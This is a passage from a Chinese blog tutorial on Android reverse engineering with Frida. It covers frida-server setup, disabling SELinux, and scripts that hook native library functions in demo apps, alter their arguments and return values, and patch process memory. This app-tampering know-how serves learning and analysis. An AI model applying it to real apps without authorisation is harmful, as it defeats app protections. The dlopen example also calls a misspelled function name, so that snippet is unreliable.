class=\"language-bash\">而后启动</span><br>/data/local/tmp/frida-server<br> frida-ps -U # 该指令执行过后能够看到在运行的frida-server<br> frida-ls-devices # 查看当前的设备<br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310031921608.png\" alt=\"image-20231003192150554\"></p>\n<p>还需要保证 selinux 是关闭的状态，可以在 adb shell 里，su - 获得 root 权限之后，输入 setenforce 0 命令来获得。</p>\n<h3 id=\"adb常用指令\"><a href=\"#adb常用指令\" class=\"headerlink\" title=\"adb常用指令\"></a>adb常用指令</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">adb devices # 列出当前已经连接的安卓设备<br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310031916069.png\" alt=\"image-20231003191603976\"></p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">adb -s &lt;device_id&gt; shell # 这里可以使用adb -s 127.0.0.1:5555 shell 连接<br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"Frida-Hook-Native脚本编写\"><a href=\"#Frida-Hook-Native脚本编写\" class=\"headerlink\" title=\"Frida Hook Native脚本编写\"></a>Frida Hook Native脚本编写</h2><p>脚本运行指令</p>\n<figure class=\"highlight powershell\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs powershell\">frida <span class=\"hljs-literal\">-U</span> <span class=\"hljs-operator\">-f</span> &lt;com.example.x86demo 需要加载的包名&gt; <span class=\"hljs-literal\">-l</span> &lt;hook.js 本次运行的脚本&gt;<br></code></pre></td></tr></tbody></table></figure>\n\n<p>当然也可以使用python的脚本运行，但是不推荐，看不到js代码中的报错</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> frida<br><span class=\"hljs-keyword\">import</span> sys<br><span class=\"hljs-comment\"># 定义目标应用程序的包名和目标函数名</span><br>target_package_name = <span class=\"hljs-string\">'com.example.x86demo'</span><br>target_function_name = <span class=\"hljs-string\">'Java_com_example_x86demo_MainActivity_stringFromJNI'</span> <span class=\"hljs-comment\"># 这里注意使用的函数名称一定是以Java为开头的函数</span><br><br><br><span class=\"hljs-comment\"># 创建Frida会话并附加到目标应用程序</span><br>device = frida.get_device(<span class=\"hljs-string\">'emulator-5554'</span>)<br>pid = device.spawn([target_package_name])<br>session = device.attach(pid)<br><span class=\"hljs-comment\"># device.resume(pid)</span><br><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">on_message</span>(<span class=\"hljs-params\">message, data</span>):<br>    <span class=\"hljs-keyword\">if</span> message[<span class=\"hljs-string\">'type'</span>] == <span class=\"hljs-string\">'send'</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] {0}\"</span>.<span class=\"hljs-built_in\">format</span>(message[<span class=\"hljs-string\">'payload'</span>]))<br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-built_in\">print</span>(message)<br><br><span class=\"hljs-comment\"># 创建Native层Hook</span><br>script = session.create_script(<span class=\"hljs-string\">\"\"\"</span><br><span class=\"hljs-string\">Java.perform(() =&gt; {</span><br><span class=\"hljs-string\">\t// 这里写js脚本</span><br><span class=\"hljs-string\">})           </span><br><span class=\"hljs-string\">\"\"\"</span>)<br><br><span class=\"hljs-comment\"># 注册Hook回调函数</span><br>script.on(<span class=\"hljs-string\">'message'</span>, on_message)<br><br><span class=\"hljs-comment\"># 加载并运行Hook脚本</span><br>script.load()<br><span class=\"hljs-comment\"># 保持脚本运行</span><br><span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Press any key to exit...\"</span>)<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"获取so基地址\"><a href=\"#获取so基地址\" class=\"headerlink\" title=\"获取so基地址\"></a>获取so基地址</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookBaseAddress</span>(<span class=\"hljs-params\"></span>) {<br>    <span class=\"hljs-keyword\">const</span> address = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findBaseAddress</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>);<br>    <span class=\"hljs-keyword\">if</span> (address) {<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(address); <span class=\"hljs-comment\">//这里我获取到的是 0xb8f91000</span><br>    }<br>}<br><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"查看native层内容\"><a href=\"#查看native层内容\" class=\"headerlink\" title=\"查看native层内容\"></a>查看native层内容</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// 枚举native层函数</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookImEx</span>(<span class=\"hljs-params\"></span>) {<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"以下是导入函数：\"</span>);<br>    <span class=\"hljs-keyword\">var</span> importMethods = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">enumerateImports</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>);<br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> index = <span class=\"hljs-number\">0</span>; index &lt; importMethods.<span class=\"hljs-property\">length</span>; index++) {<br>        <span class=\"hljs-keyword\">const</span> element = importMethods[index];<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>(element));<br>    }<br><br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"以下是导出函数：\"</span>);<br>    <span class=\"hljs-keyword\">var</span> exportMethods = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">enumerateExports</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>);<br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> index = <span class=\"hljs-number\">0</span>; index &lt; exportMethods.<span class=\"hljs-property\">length</span>; index++) {<br>        <span class=\"hljs-keyword\">const</span> element = exportMethods[index];<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>(element));<br>    }<br>}<br><span class=\"hljs-comment\">// 查看native层的调用结果</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookByName</span>(<span class=\"hljs-params\"></span>) {<br>    <span class=\"hljs-keyword\">const</span> address = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findExportByName</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>, <span class=\"hljs-string\">\"Java_com_zyc_fridasodemo_Calc_addThreeNum\"</span>);<br>    <span class=\"hljs-keyword\">if</span> (address) {<br>        <span class=\"hljs-title class_\">Interceptor</span>.<span class=\"hljs-title function_\">attach</span>(address, {<br>            <span class=\"hljs-title function_\">onEnter</span>(<span class=\"hljs-params\">args</span>) {<br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"onEnter...\"</span>);<br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"args[0]:\"</span>,args[<span class=\"hljs-number\">0</span>]);<br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"args[1]:\"</span>,args[<span class=\"hljs-number\">1</span>]);<br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"args[2]：\"</span>,args[<span class=\"hljs-number\">2</span>]);<br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"args[3]：\"</span>,args[<span class=\"hljs-number\">3</span>]);<br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"args[4]：\"</span>,args[<span class=\"hljs-number\">4</span>]);<br>            },<br>            <span class=\"hljs-title function_\">onLeave</span>(<span class=\"hljs-params\">retval</span>) { <br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"onLeave...\"</span>);<br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"retval:\"</span>,retval); <span class=\"hljs-comment\">// 函数返回值</span><br>            }<br>        });<br>    }<br>}<br><br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"修改native层的参数\"><a href=\"#修改native层的参数\" class=\"headerlink\" title=\"修改native层的参数\"></a>修改native层的参数</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// 修改native层的内容</span><br><span class=\"hljs-comment\">// 根据上面获取的 args 我们可以修改参数，但注意参数得是 NativePointer，直接用 “=” 赋值会报错“expected a pointer”</span><br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookParam</span>(<span class=\"hljs-params\"></span>){<br>    <span class=\"hljs-keyword\">const</span> address = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findExportByName</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>, <span class=\"hljs-string\">\"Java_com_zyc_fridasodemo_Calc_addThreeNum\"</span>);<br>    <span class=\"hljs-keyword\">if</span> (address) {<br>        <span class=\"hljs-title class_\">Interceptor</span>.<span class=\"hljs-title function_\">attach</span>(address, {<br>            <span class=\"hljs-title function_\">onEnter</span>(<span class=\"hljs-params\">args</span>) {<br>                args[<span class=\"hljs-number\">2</span>] = <span class=\"hljs-title function_\">ptr</span>(<span class=\"hljs-number\">1000</span>); <span class=\"hljs-comment\">// 写成 args[2]=1000 会报错</span><br>            },<br>            <span class=\"hljs-title function_\">onLeave</span>(<span class=\"hljs-params\">retval</span>) {}<br>        });<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"修改native层函数的返回值\"><a href=\"#修改native层函数的返回值\" class=\"headerlink\" title=\"修改native层函数的返回值\"></a>修改native层函数的返回值</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookReturn</span>(<span class=\"hljs-params\"></span>){<br>    <span class=\"hljs-keyword\">const</span> address = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findExportByName</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>, <span class=\"hljs-string\">\"Java_com_zyc_fridasodemo_Calc_addThreeNum\"</span>);<br>    <span class=\"hljs-keyword\">if</span> (address) {<br>        <span class=\"hljs-title class_\">Interceptor</span>.<span class=\"hljs-title function_\">attach</span>(address, {<br>            <span class=\"hljs-title function_\">onEnter</span>(<span class=\"hljs-params\">args</span>) {},<br>            <span class=\"hljs-title function_\">onLeave</span>(<span class=\"hljs-params\">retval</span>) {<br>                retval.<span class=\"hljs-title function_\">replace</span>(<span class=\"hljs-number\">32</span>); <span class=\"hljs-comment\">//用 replace() 不要用 =</span><br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"retval:\"</span>,retval);<br>                <span class=\"hljs-comment\">// 如果返回值是jstring，得用下面方式替换</span><br>               <span class=\"hljs-comment\">//var env = Java.vm.getEnv(); //获取env对象，即第一个参数</span><br>               <span class=\"hljs-comment\">//var jstrings = env.newStringUtf(\"xxxx\"); //返回的是字符串指针，使用jni函数构造一个newStringUtf对象用来代替这个指针</span><br>               <span class=\"hljs-comment\">//retval.replace(jstrings); </span><br>            }<br>        });<br>    }<br>}<br><br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"Hook未导出的函数\"><a href=\"#Hook未导出的函数\" class=\"headerlink\" title=\"Hook未导出的函数\"></a>Hook未导出的函数</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookDynamic</span>(<span class=\"hljs-params\"></span>) {<br>    <span class=\"hljs-keyword\">const</span> soAddress = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findBaseAddress</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"so基址：\"</span> + soAddress);<br>    <span class=\"hljs-keyword\">if</span> (soAddress) {<br>        <span class=\"hljs-keyword\">const</span> methodAddress = soAddress.<span class=\"hljs-title function_\">add</span>(<span class=\"hljs-number\">0x0690</span>); <span class=\"hljs-comment\">// thrumb指令集要+1</span><br>        <span class=\"hljs-keyword\">if</span> (methodAddress) {<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"函数地址：\"</span> + methodAddress);<br>            <span class=\"hljs-title class_\">Interceptor</span>.<span class=\"hljs-title function_\">attach</span>(methodAddress, {<br>                <span class=\"hljs-title function_\">onEnter</span>(<span class=\"hljs-params\">args</span>) {<br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"hook动态注册函数的参数：\"</span> + <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-property\">vm</span>.<span class=\"hljs-title function_\">getEnv</span>().<span class=\"hljs-title function_\">getStringUtfChars</span>(args[<span class=\"hljs-number\">2</span>], <span class=\"hljs-literal\">null</span>).<span class=\"hljs-title function_\">readCString</span>()); <span class=\"hljs-comment\">//打印jstring要用getStringUtfChars</span><br>                },<br>                <span class=\"hljs-title function_\">onLeave</span>(<span class=\"hljs-params\">retval</span>) {<br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"hook动态注册函数的返回值：\"</span> + <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-property\">vm</span>.<span class=\"hljs-title function_\">getEnv</span>().<span class=\"hljs-title function_\">getStringUtfChars</span>(retval, <span class=\"hljs-literal\">null</span>).<span class=\"hljs-title function_\">readCString</span>());<br>                }<br>            });<br>        }<br>    }<br>}<br><br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"Hook-so加载（dlopen）\"><a href=\"#Hook-so加载（dlopen）\" class=\"headerlink\" title=\"Hook so加载（dlopen）\"></a>Hook so加载（dlopen）</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// 当遇到“等so加载完后进行某Hook操作时”，可以Hook dlopen（有的是android_dlopen_ext）方法来确定so的加载。PS：不推荐Hook System.loadLibrary()，因为加载so的方式并不止这一种，而且最终都会调用 dlopen()</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookDlopen</span>(<span class=\"hljs-params\"></span>) {<br>    <span class=\"hljs-keyword\">let</span> dlopenAddr = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findExportByName</span>(<span class=\"hljs-literal\">null</span>, <span class=\"hljs-string\">\"dlopen\"</span>);<br>    <span class=\"hljs-keyword\">if</span> (dlopenAddr) {<br>        <span class=\"hljs-title class_\">Interceptor</span>.<span class=\"hljs-title function_\">attach</span>(dlopenAddr, {<br>            <span class=\"hljs-title function_\">onEnter</span>(<span class=\"hljs-params\">args</span>) { <span class=\"hljs-comment\">// dlopen(const char* filename, int flags)</span><br>                <span class=\"hljs-keyword\">let</span> soName = args[<span class=\"hljs-number\">0</span>].<span class=\"hljs-title function_\">readCString</span>(); <span class=\"hljs-comment\">// \"/data/app/com.zyc.fridasodemo-1/lib/x86/libnative-lib.so\"</span><br>                <span class=\"hljs-keyword\">if</span> (soName.<span class=\"hljs-title function_\">indexOf</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>) != -<span class=\"hljs-number\">1</span>) {<br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"成功加载到了--&gt;\"</span> + soName);<br>                    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">hasloaded</span> = <span class=\"hljs-literal\">true</span>;<br>                }<br>            },<br>            <span class=\"hljs-title function_\">onLeave</span>(<span class=\"hljs-params\">retval</span>) { <span class=\"hljs-comment\">//onLeave()中才是dlopen()加载完成后</span><br>                <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">hasloaded</span>) {<br>                    <span class=\"hljs-title function_\">hooImEx</span>(); <span class=\"hljs-comment\">// 等so加载完成就执行导入/导出函数打印</span><br>                }<br>            }<br>        });<br>    }<br>}<br><br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"读写内存\"><a href=\"#读写内存\" class=\"headerlink\" title=\"读写内存\"></a>读写内存</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookMem</span>(<span class=\"hljs-params\"></span>) {<br>        <span class=\"hljs-keyword\">const</span> soAddress = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findBaseAddress</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>);<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"so基址：\"</span> + soAddress);<br>        <span class=\"hljs-keyword\">if</span> (soAddress) {<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"读取...\"</span>);<br>            <span class=\"hljs-keyword\">const</span> strAddress = soAddress.<span class=\"hljs-title function_\">add</span>(<span class=\"hljs-number\">0x028334</span>);<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"打印这段字符串：\"</span> + strAddress.<span class=\"hljs-title function_\">readCString</span>());<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"读16字节：\"</span>);<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(strAddress.<span class=\"hljs-title function_\">readByteArray</span>(<span class=\"hljs-number\">16</span>));<br>    <br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"写入...\"</span>);<br>            <span class=\"hljs-title class_\">Memory</span>.<span class=\"hljs-title function_\">protect</span>(strAddress, <span class=\"hljs-title class_\">Process</span>.<span class=\"hljs-property\">pageSize</span>, <span class=\"hljs-string\">\"rw-\"</span>); <span class=\"hljs-comment\">//修改内存页属性后再写入，不然可能报access violation accessing</span><br>            strAddress.<span class=\"hljs-title function_\">writeUtf8String</span>(<span class=\"hljs-string\">\"Hello from PHP\"</span>) <span class=\"hljs-comment\">//内存写入字符串,该方法末尾会自动添加'\\0'</span><br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"\\r\\n打印这段字符串：\"</span> + strAddress.<span class=\"hljs-title function_\">readCString</span>());<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"读16字节：\\r\\n\"</span>);<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(strAddress.<span class=\"hljs-title function_\">readByteArray</span>(<span class=\"hljs-number\">16</span>));<br>        }<br>    }<br>    <br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"一个例子\"><a href=\"#一个例子\" class=\"headerlink\" title=\"一个例子\"></a>一个例子</h3><h4 id=\"题目描述\"><a href=\"#题目描述\" class=\"headerlink\" title=\"题目描述\"></a>题目描述</h4><p>很简单的一个app，打开会显示Hello from C++，题目的要求是修改该字符串为任意值。看起来挺容易</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004222425282.png\" alt=\"image-20231004222425282\"></p>\n<p>使用jeb逆向看一下MainActivity的逻辑：字符串生成函数来自native层的stringFromJNI，这里的第一想法是使用frida 在native做hook。<br><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004222542793.png\" alt=\"image-20231004222542793\"></p>\n<p>导出libnative-lib.so文件，IDA pro 7.5还是蛮强大的，老版本的IDA是不认识JNI函数的。在export找到对应的函数：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004222937267.png\" alt=\"image-20231004222937267\"></p>\n<p>逻辑很简单</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004222953301.png\" alt=\"image-20231004222953301\"></p>\n<p>第一次使用的脚本如下：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookByName</span>(<span class=\"hljs-params\"></span>) {<br>        <span class=\"hljs-keyword\">const</span> address = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findExportByName</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>,<span class=\"hljs-string\">\"Java_com_example_x86demo_MainActivity_stringFromJNI\"</span>);<br>        <span class=\"hljs-keyword\">if</span> (address) {<br>            <span class=\"hljs-title class_\">Interceptor</span>.<span class=\"hljs-title function_\">attach</span>(address, {<br>                <span class=\"hljs-title function_\">onEnter</span>(<span class=\"hljs-params\">args</span>) {<br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"onEnter...\"</span>);<br>                },<br>                <span class=\"hljs-title function_\">onLeave</span>(<span class=\"hljs-params\">retval</span>) { <br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"onLeave...\"</span>);<br>                    <span class=\"hljs-keyword\">var</span> env = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-property\">vm</span>.<span class=\"hljs-title function_\">getEnv</span>();<br>                    <span class=\"hljs-keyword\">var</span> jstrings = env.<span class=\"hljs-title function_\">newStringUtf</span>(<span class=\"hljs-string\">\"Hacked!\"</span>);<br>                    retval.<span class=\"hljs-title function_\">replace</span>(jstrings);<br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"retval:\"</span>,retval); <span class=\"hljs-comment\">// 函数返回值</span><br>                }<br>            });<br>        }<span class=\"hljs-keyword\">else</span>{<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"NOT FOUND!\"</span>);<br>        }<br>    }<br></code></pre></td></tr></tbody></table></figure>\n\n<p>​\t但是frida一直是NOT FOUND，这是因为frida要重启APP去执行该脚本，在onCreate函数执行前libnative-lib.so还没有加载，因此在程序内存中是找不到该so文件的。因此有两种方法，一种是使用dlopen手动加载该so，但是程序直接崩溃了。。。。</p>\n<p>​\t另一种方法是hook onCreate函数，在onCreate函数执行之前执行native的hook，当然这里so文件已经加载进内存了，stringFromJNI中的字符串是硬编码存储，也可以直接修改内存。要注意以下几点：</p>\n<ul>\n<li><strong>hook 